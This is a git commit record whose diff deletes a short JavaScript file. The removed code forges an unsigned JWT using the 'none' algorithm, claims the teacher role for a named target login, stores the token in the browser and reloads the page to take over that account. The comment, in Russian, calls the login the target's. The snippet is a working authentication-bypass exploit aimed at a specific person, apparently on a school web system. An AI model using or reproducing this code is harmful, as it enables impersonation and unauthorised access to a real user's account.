5fa845426ad50560a69a2f2e444b47f7c0489462
Andro2012 <andro20123337@mail.ru>
2026-05-13 08:50:18 +0300

    Delete myfile.js

--- myfile.js
+++
@@ -1,9 +0,0 @@
-let teacher = "bujanovagv"; // логин цели
-
-let h = { alg: "none", typ: "JWT" };
-let p = { role: "teacher", login: teacher, iat: Date.now()/1000 };
-let token = btoa(JSON.stringify(h)).replace(/=/g,'') + "." + 
-            btoa(JSON.stringify(p)).replace(/=/g,'') + ".";
-
-localStorage.setItem("token_bearer", token);
-location.reload();
